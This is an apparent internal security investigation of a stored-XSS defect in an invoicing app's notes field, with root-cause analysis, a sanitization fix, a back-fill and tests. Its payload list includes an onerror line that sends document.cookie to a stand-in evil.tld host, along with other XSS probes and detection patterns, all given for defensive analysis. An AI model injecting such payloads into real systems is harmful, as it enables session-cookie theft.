# Incident Investigation: SQ-156

## Metadata
- **Key:** SQ-156
- **Type:** Defect (security)
- **Priority:** High
- **Status:** Open
- **Assignee:** Ely (elyermad@gmail.com)
- **Reporter:** not exposed in `--json` payload; filed during exploratory testing of SQ-29 on staging
- **Sprint:** (not tied to a sprint in the payload — ticket is `Open` in triage queue)
- **Linked US/items / PRs:**
  - Origin story: `SQ-29` (Add Notes / Custom Message to Invoice) — found during QA of SQ-29
  - Related DB rows: `INV-2026-0009` (staging; `notes = <script>alert(1)</script>`), `INV-2026-0002` (also on staging; same payload)
  - No fix branch, PR, or commit referenced anywhere in the repo

## Summary
The invoice `notes` field (and the symmetric `terms` field) is persisted **verbatim** to `public.invoices.notes` without any sanitization, HTML escaping, or stripping — the Zod validator enforces only a length cap (2000 chars for `notes`, 1000 for `terms`) and accepts any string content. Malicious payloads such as `<script>alert(1)</script>` round-trip through `POST /api/invoices` and `PUT /api/invoices/[id]` and land in the DB in literal form (empirically verified against staging: two rows already exist). The **actual XSS risk at the application's current DOM/PDF render paths is zero** because (a) `notes` is never rendered anywhere in the React UI — it is only consumed by the `@react-pdf/renderer` `<Text>` component, which treats its children as plain text and does not interpret HTML/JS, and (b) the email template intentionally never includes `notes`. The defect is therefore a **latent / defense-in-depth** gap: the moment any future feature renders `notes` into an HTML surface (React `dangerouslySetInnerHTML`, an `innerHTML` sink, a `react-email` HTML body, the reminder email body slated for SQ-31, or a CRM/export that emits HTML), the unsanitized payload already in the DB becomes a live stored-XSS primitive with no additional attacker action needed. Treating it as "not reachable today" ignores that the data is durable and the code that reads it is not — fixing at write-time is the only stable defense.

## Context
### Feature affected
- **User story / feature:** EPIC-SQ-2 (Invoice Management) → STORY-SQ-29 (Add Notes / Custom Message to Invoice). Field lives on the invoice create form (`/invoices/create`) and edit form (`/invoices/[id]/edit`). Persisted in `public.invoices.notes` (`text`, nullable, no `CHECK` constraint). Also rendered in the PDF preview / download.
- **Business impact:** Latent stored-XSS vector on a per-user basis; `invoices` is RLS-protected so a user can currently only attack themselves via their own browser session. Risk expands to a real attack surface the instant (a) any feature renders `notes` as HTML, (b) a support/admin dashboard displays other users' notes, or (c) an email client (notably Gmail "Show original"/forwarded MIME) decides to render the HTML body of a future reminder that embeds notes. Also breaks OWASP ASVS V5.3 (output encoding / input sanitization) and the internal `DEV/error-handling.md` guideline that mandates input normalization at trust boundaries.

### Reporter observations
From the Jira description (translated / summarized):
1. Navigate to `/invoices/create` in staging.
2. Fill minimum valid client + line item.
3. In the `notes` textarea, type `<script>alert(1)</script>`.
4. Submit the invoice.
5. `POST /api/invoices` returns `201 Created`.
6. Inspect the resulting row (`invoices.notes`): the value is stored **verbatim** as `<script>alert(1)</script>`.

Reporter's documented reproduction artifact: `INV-2026-0009` on staging, stored with exact payload, SQL-verified.

Impact bullets per ticket:
- Stored unsanitized content (HTML / script literal) in a DB column.
- XSS risk "in preview/PDF and/or future views".
- No sanitization at validation or at persistence layer.

## Related files / code
- **Zod validator (write-path trust boundary):** `src/lib/validations/invoice.ts`
  - `createInvoiceSchema.notes` — lines 80–84: `z.string().max(2000, '...').optional().or(z.literal(''))`. No `.transform`, no `.refine`, no HTML/script filter.
  - `createInvoiceSchema.terms` — lines 85–89: same shape, 1000-char cap, same absence of sanitization.
  - `updateInvoiceSchema.notes` / `.terms` — lines 142–153: same problem for the `PUT` path.
- **Create route handler:** `src/app/api/invoices/route.ts`
  - Destructures `notes, terms` at line 173; writes them unchanged at line 239 / 240 as `notes: notes || null` / `terms: terms || null`. No sanitization call anywhere between `safeParse` (line 157) and the Supabase insert.
- **Update route handler:** `src/app/api/invoices/[id]/route.ts`
  - Same pattern: `updates.notes = notes || null` (line 330) / `updates.terms = terms || null` (line 334). No sanitization.
- **Create form UI:** `src/app/(app)/invoices/create/page.tsx` lines 327–349 — `TextareaWithCounter` wired to `form.control` with `name="notes"`, `maxLength={2000}`, `data-testid="invoice-notes-input"`. Browser `maxLength` is the only client-side constraint; it is not a content filter.
- **Edit form UI:** `src/app/(app)/invoices/[id]/edit/page.tsx` lines 133, 198 — pre-fills `notes` from the fetched invoice and submits via the same Zod schema.
- **DB schema:** `public.invoices.notes` — `text`, `character_maximum_length = NULL`, `is_nullable = YES` (verified via `information_schema.columns`). No `CHECK` constraint that filters HTML/script content. Same for `terms`. No repo-tracked migration under `supabase/migrations/` defines a filter (only file is `20260312_add_check_constraint_tax_rate_positive.sql`).
- **PDF renderer (current read-path):** `src/app/(app)/invoices/[id]/components/invoice-document.tsx` lines 575–586 — renders `data.notes` and `data.terms` via `<Text>{sanitizeForPDF(data.notes)}</Text>`. `sanitizeForPDF` (`src/lib/utils/pdf-utils.ts` lines 105–108) only strips emoji code points via `removeEmojis` and trims whitespace; it **does not** strip HTML tags, `<script>`, event handlers, or URIs. It works here because `@react-pdf/renderer`'s `<Text>` primitive treats children as plain text (not HTML), so tags are rendered literally into the PDF as visible characters — ugly, but not executable.
- **HTML email template:** `src/lib/services/email-service.ts` lines 75–82 define `escapeHtml(...)`. This helper is applied to `payment method` label/value only (`formatPaymentMethodHtml`, lines 86–98). `notes` is **not** passed into `sendInvoiceEmail(...)` nor into `generateInvoiceEmailHtml(...)` (see `SendInvoiceEmailParams` on lines 25–42 — no notes field). So the email send path does not currently render notes, but the infrastructure to render them safely already exists and is deliberately unused.
- **React UI for the invoice detail page:** `src/app/(app)/invoices/[id]/page.tsx` — renders `InvoicePreview` (iframe of PDF blob) but never renders `data.notes` into JSX. There is **no** `dangerouslySetInnerHTML`, `innerHTML`, or `v-html` anywhere under `src/` (grep confirmed, 0 matches).
- **API read routes that emit notes:** `src/app/api/invoices/[id]/route.ts:172`, `src/app/api/invoices/[id]/send/route.ts:233`, `src/app/api/invoices/[id]/pdf/route.ts:144` — all pass the raw DB `notes` value straight back into the JSON response / PDF data structure. If any of those JSON responses is consumed by a non-React client that builds HTML from the string (a mobile WebView, an admin dashboard, a Zapier integration, a CSV→HTML export), the unsanitized content is re-exposed.

## Reproduction attempt

### Method
Read-only: inspected all render sinks in the repo (React JSX, `@react-pdf/renderer`, Resend HTML template, JSON API responses) and queried staging DB directly to confirm persistence. No POSTs issued from the investigation.

### DB verification (read-only)
```sql
SELECT id, invoice_number, notes
FROM public.invoices
WHERE notes ILIKE '%script%' OR notes ILIKE '%<%'
   OR notes ILIKE '%onerror%' OR notes ILIKE '%javascript:%'
ORDER BY created_at DESC
LIMIT 20;
```
Result (2 rows):
- `INV-2026-0009`, `notes = <script>alert(1)</script>` (the row Jira cites)
- `INV-2026-0002`, `notes = <script>alert(1)</script>` (earlier QA run)

Both rows confirm the reporter's claim: the payload is stored literally, byte-for-byte, with no escaping or encoding applied.

### Render-path analysis — payload outcomes per sink

1. **Invoice detail page (`/invoices/[id]`)** — `notes` is not interpolated into JSX anywhere on the page; the page only renders the PDF blob inside an `<iframe>`. React auto-escaping is moot because the string is never reached by JSX. **Outcome: not exploitable.**

2. **PDF preview + server-rendered PDF download (`/api/invoices/[id]/pdf`, `sendInvoiceEmail` attachment):** `@react-pdf/renderer`'s `<Text>` primitive renders children as PDF text glyphs. `<script>alert(1)</script>` prints as literal 24 characters onto the Notes section of the PDF. No JavaScript execution context in a PDF consumer (Chrome, Firefox, Acrobat) will fire `alert(1)` from those glyphs — `/JS` and `/JavaScript` PDF actions require a dedicated PDF object, not plain text. **Outcome: not exploitable; cosmetic only.**

3. **HTML email body (`generateInvoiceEmailHtml`):** `notes` is not part of the interpolation set — `SendInvoiceEmailParams` does not include it, and the template body concatenates only `clientName`, `invoiceNumber`, `total`, `dueDate`, `businessName`, and `paymentMethodsSection`. **Outcome: not exploitable today.** However: the template is plain string concatenation (not JSX; React does not auto-escape here). The payment-methods section is already XSS-safe because `escapeHtml` is applied; `clientName` / `businessName` are **not** escaped. A future change that adds `notes` to the template via `${notes}` would immediately turn the stored payload into `script` tags inside the email body — and Gmail/Outlook strip `<script>` in the HTML-sanitization pass, but `onerror=` attributes on `<img>` tags, `javascript:` URLs, and `<iframe srcdoc>` variants generally do get executed by a subset of clients (notably Apple Mail, older Thunderbird, embedded WebViews). The ticket's own impact bullet "Posible exposición en preview/PDF y/o futuras vistas" points at exactly this risk.

4. **API read routes (`GET /api/invoices/[id]`, `POST /api/invoices/[id]/send`, `GET /api/invoices/[id]/pdf`):** all three emit the raw `invoice.notes` in the JSON payload. Any third-party consumer (OpenAPI generator, QA automation, partner integration, future CRM export) receives the literal HTML. **Outcome: not exploitable by itself, but the bad data is now propagated to every downstream consumer.**

### Simulated adversarial payloads (analysis only)
The following payloads would all pass the current Zod schema (length ≤ 2000, string) and land unchanged in the DB:
- `<script>alert(1)</script>` — benign probe (confirmed in DB).
- `<img src=x onerror=alert(document.cookie)>` — DOM-sink payload; harmless in PDF, dangerous in any future HTML sink.
- `<a href="javascript:stealToken()">click</a>` — link-based; harmless in PDF.
- `</textarea><script>...</script>` — attempts to break out of a parent element; only dangerous if the HTML sink doesn't escape first.
- `"><img src=x onerror=fetch('https://evil.tld?c='+document.cookie)>` — quote-escape breakout; same caveat.
- 2000 × `A` + `<script>alert(1)</script>` — length cap bypass attempt; the current schema enforces `max(2000)` so this is truncated by Zod (the `.max(2000)` errors before insert, not silently truncated — safe).

None of these escape the current render paths, but every one of them will persist successfully and become exploitable against the first HTML-rendering consumer that appears.

### Data seed
No new seed required — the two existing rows (`INV-2026-0009`, `INV-2026-0002`) on staging already constitute the full evidence. Any remediation must (a) fix the write path, and (b) back-fill/scrub these two rows.

### Reproduction status
- **Persistence defect: REPRODUCED (read-only).** Two rows on staging carry the exact payload from the Jira description.
- **XSS exploitability at live endpoints: NOT REPRODUCIBLE TODAY.** No current sink renders `notes` into a JavaScript-capable context.
- **Latency of the latent risk: HIGH.** Story SQ-31 (reminder emails) and any future public invoice view / client portal / admin view will flip the status from "latent" to "live" with no additional attacker effort.

## Root Cause
**Classification:** code-defect (missing input hardening at trust boundary — OWASP ASVS V5.1.3 / V5.3.3).

Chain of causes:
1. The Zod schema in `src/lib/validations/invoice.ts` (lines 80–84 for `notes`, 85–89 for `terms`, plus their update-path twins at 142–153) was written to enforce **size** but not **content**. `.max(2000)` is a length guard only; no `.transform` stripping HTML, no `.refine` rejecting tag characters, no call to `DOMPurify.sanitize(...)` or `sanitize-html`, no explicit escape.
2. The create/update API handlers (`src/app/api/invoices/route.ts:239`, `src/app/api/invoices/[id]/route.ts:330`) insert the string directly into Supabase. They trust the Zod-validated payload to already be safe, which is the correct pattern if-and-only-if the schema itself sanitizes; it does not.
3. The DB column (`public.invoices.notes text`) has no `CHECK` constraint or sanitizing trigger. DB-layer defense was never added.
4. The PDF rendering path was accidentally safe (because `@react-pdf/renderer` doesn't parse HTML) and the HTML email path was accidentally safe (because `notes` was never passed to the email template) — both are **coincidental, not architectural**. No test pinned the safety property; no reviewer flagged the missing sanitization because the rendered output "looked fine in the PDF".
5. The `sanitizeForPDF` helper (`src/lib/utils/pdf-utils.ts:105`) is named as if it sanitizes but only removes emojis. Naming confusion contributes to the false sense of coverage.

The defect is a **write-time omission** rather than a render-time one. Because the data is durable and outlives any one render path, fixing only the render side would be insufficient — the next render path can silently re-introduce the vulnerability. This is the textbook case for belt-and-braces: sanitize on write **and** escape on every HTML output.

## Decision
**Verdict:** FIX
**Justification:** The defect is real (confirmed persistence in staging DB), reproducible (already reproduced by QA), maps to a security-impacting Acceptance Criteria gap on SQ-29, and scores High priority correctly. Zero live XSS sinks today does **not** downgrade the bug — it downgrades the blast radius, but the underlying write-path contract is broken and the two existing rows are a mini-timebomb for the first renderer that ships. Cost to fix is low (single schema change + back-fill); cost of not fixing compounds with every new consumer of `invoices.notes`. A NO-FIX / INVALID verdict would be wrong here.
**Jira "Root Cause" custom field suggestion:** `code-defect` (sub-category: missing-input-validation / missing-output-encoding). Consistent with how SQ-155 was classified.

## Recommended fix

### Strategy: defense-in-depth, write + read, across `notes` **and** `terms` (symmetric defect).

- **Scope:** s
- **Files to touch:**
  - `src/lib/validations/invoice.ts` (both `createInvoiceSchema` and `updateInvoiceSchema`, both `notes` and `terms`)
  - `src/lib/services/email-service.ts` (harden `clientName`, `businessName`, and any future `notes`/`terms` interpolations with `escapeHtml` — already defined on line 75–82)
  - `src/lib/utils/pdf-utils.ts` (optional: rename `sanitizeForPDF` or add a `sanitizeHtmlInput` helper so the naming tracks reality)
  - A new SQL back-fill (one-shot): scrub the two known rows and any others matching the regex.
  - Tests: `qa/tests/...` or Vitest unit tests against the schema.

### Approach (ordered, minimally invasive)

1. **Write-time: Zod `.transform` + `.refine`.** Install `sanitize-html` (or `isomorphic-dompurify`) and apply in the schema:

   ```ts
   import sanitizeHtml from 'sanitize-html';

   const safeFreeText = (max: number) =>
     z
       .string()
       .max(max, `Máximo ${max} caracteres`)
       .transform(val =>
         sanitizeHtml(val, {
           allowedTags: [],          // strip all tags
           allowedAttributes: {},    // strip all attrs
           disallowedTagsMode: 'discard',
         }).trim()
       )
       .optional()
       .or(z.literal(''));

   // notes: safeFreeText(2000)
   // terms: safeFreeText(1000)
   ```
   Rationale: `allowedTags: []` + `disallowedTagsMode: 'discard'` removes every `<...>` construct and every inline handler. This is stricter than DOMPurify's default "escape only" mode; it yields clean readable text that is trivially safe in **any** future sink — HTML, plain text, CSV, PDF — with no per-sink logic required. Trade-off: users cannot use `<b>` / `<i>` / line breaks via `<br>` in notes; the existing UX is a plain `<textarea>`, so this does not regress feature surface.
   If the product later wants rich text in notes, switch to a richer `allowedTags: ['b','i','em','strong','br','p']` allowlist — the transform abstraction makes that a one-line change.

2. **Read-time (belt): escape at every HTML output.** Even with sanitize-on-write, keep the `escapeHtml` convention in `email-service.ts` and extend it to `clientName` and `businessName` in `generateInvoiceEmailHtml` (lines 175, 179, 182). This protects against any future regression in the write layer and against data imported from other sources (CSV import, migration scripts, support manual UPDATE).

3. **DB back-fill (one-shot migration):**
   ```sql
   UPDATE public.invoices
   SET notes = regexp_replace(notes, '<[^>]+>', '', 'g')
   WHERE notes ~ '<[^>]+>';

   UPDATE public.invoices
   SET terms = regexp_replace(terms, '<[^>]+>', '', 'g')
   WHERE terms ~ '<[^>]+>';
   ```
   Ship as a timestamped migration under `supabase/migrations/`. The `regexp_replace` mirrors the sanitize-html "strip all tags" behavior closely enough for legacy rows; the exact two known rows on staging will be scrubbed and — the moment the write-path fix is in place — no new bad rows can appear.

4. **Optional hardening: DB `CHECK` constraint.** Add a `CHECK (notes !~ '<[^>]+>') NOT VALID` constraint, or a trigger that sanitizes on `INSERT`/`UPDATE`. Only worthwhile if the team wants DB-layer enforcement independent of the API (e.g. to protect against direct Supabase SQL access by privileged users). Probably overkill for MVP — not recommended unless Security asks.

5. **Rename `sanitizeForPDF` → `stripEmojisForPDF`.** The current name invites the mistake made here. One-line refactor plus a short comment stating "for HTML safety use `sanitize-html` at the Zod layer, not this helper".

### Edge cases covered
- Empty / null `notes`: `.optional().or(z.literal(''))` preserved; Supabase insert logic `notes: notes || null` unchanged.
- Whitespace-only notes after sanitize: `.trim()` collapses them, `|| null` in the insert keeps DB clean.
- Legitimate text that contains `<` or `>` characters for non-markup reasons (e.g. "quantity < 10"): `sanitize-html` with `allowedTags: []` will strip such sequences when they look like tags. If this is a concern, replace the transform with `sanitizeHtml(val, { ... }).replace(/&amp;/g, '&')` or use HTML-entity encoding instead of stripping. Recommend documenting the choice and covering it with a test case (`"discount > $50"` → sanitizer behavior).
- Unicode edge cases (RTL overrides, zero-width joiners): `sanitize-html` does not normalize these, but they are not XSS vectors. Out of scope for SQ-156; track separately if needed.

### Tests needed (to prevent regression)

- **Unit (Zod)** — `src/lib/validations/invoice.test.ts` (new):
  - `createInvoiceSchema.parse({ ..., notes: '<script>alert(1)</script>' })` returns `notes === ''` (tags stripped).
  - Same for `<img src=x onerror=alert(1)>`, `<a href="javascript:...">`.
  - Same set for `updateInvoiceSchema`.
  - Same set for `terms`.
  - Length overflow (2001 × 'A') still rejects with the existing 2000-char message.

- **Integration (API)** — add to existing Vitest suite for `/api/invoices`:
  - `POST /api/invoices` with `notes: '<script>alert(1)</script>'` → DB row contains scrubbed text.
  - `PUT /api/invoices/[id]` with the same → DB row scrubbed.
  - `GET /api/invoices/[id]` returns the scrubbed string.

- **E2E (Playwright, KATA)** — `qa/tests/...`:
  - Create invoice via UI with script payload in `notes`. Assert the DB row (via `dbhub` MCP or the API) has no `<` / `>` characters. Assert the rendered PDF does not contain the `<script>` literal text either.
  - Re-open invoice in edit page and confirm the textarea shows the scrubbed text (no user confusion about lost content — ideally show a toast/inline hint "Se removieron caracteres no permitidos de las notas").

- **Negative control:** confirm the legacy rows `INV-2026-0002` and `INV-2026-0009` are scrubbed to empty string after the back-fill migration, and that `SELECT ... WHERE notes ~ '<[^>]+>'` returns zero rows.

### Roll-out sequence
1. Land Zod changes + email-template escape hardening.
2. Land DB back-fill migration.
3. Verify zero offending rows in `invoices.notes` / `.terms`.
4. QA retest SQ-156 + smoke-test SQ-29.
5. Close SQ-156 with link to the fix PR.

## Additional notes

- **`terms` has the identical defect** and was not called out in the Jira description. Any fix must cover both fields or risk re-opening the same bug for `terms` in the next sprint. Recommend either explicitly updating SQ-156 to mention `terms`, or opening a linked sub-defect. My recommendation: fix both in one PR and amend the ticket description via a QA comment.
- **`clients.notes` and `payments.notes`** (from `src/app/api/clients/*` and `src/app/api/invoices/[id]/payments/route.ts`) are likely to have the same shape — worth auditing in the same pass. The grep already shows `notes: notes || null` at `src/app/api/clients/route.ts:193`, `src/app/api/clients/[id]/route.ts:159`, `src/app/api/invoices/[id]/payments/route.ts:96`. Treat as a product-wide "free-text input at trust boundary" pattern; a single shared `safeFreeText(max)` helper (exported from `@/lib/validations/shared.ts` or similar) should be the canonical fix and used everywhere.
- **Link to SQ-29:** SQ-29's test-cases file (`.context/PBI/epics/.../STORY-SQ-29/test-cases.md`, if it exists) should gain a dedicated security test row for this payload; today the AC/TCs appear to have missed the malicious-input lane, which is how the bug shipped. Cross-reference in the fix PR body.
- **`sanitizeForPDF` naming** is a small but real trap: future developers reading `{sanitizeForPDF(data.notes)}` will reasonably assume XSS-safety is being enforced. Renaming costs nothing and removes a whole class of future copy-paste bugs (e.g. a dev reusing the helper in an HTML context). Ship the rename in the same PR.
- **Threat model:** `invoices` is RLS-protected and each row belongs to a single user, so today the only person who can read `invoices[i].notes` is the owner and Supabase service-role users (admins). That means the worst-case **current** scenario is self-XSS — largely uninteresting — until a second reader appears. SQ-31 (reminder emails) and SQ-19 (client portal / public invoice view) are the likeliest triggers for that second reader. Prioritize the fix so it lands before either of those stories begins implementation.
- **Sentry / production logs** were not queried — the bug is explicitly documented as found in staging exploratory QA, not as a runtime exception; no production telemetry is expected to correlate.
- **Related incident pattern:** SQ-155 (the other auth/security bug in this reports dir) had the same structural shape — code that passed a correctness test (response works / data persists) but failed a security invariant (anti-enumeration / input-sanitization). Worth adding a project-wide checklist item to the DEV guidelines: "Every `z.string()` used at an API trust boundary must either (a) `.transform` with `sanitize-html` or (b) carry a comment explicitly justifying why raw passthrough is safe for its render paths."
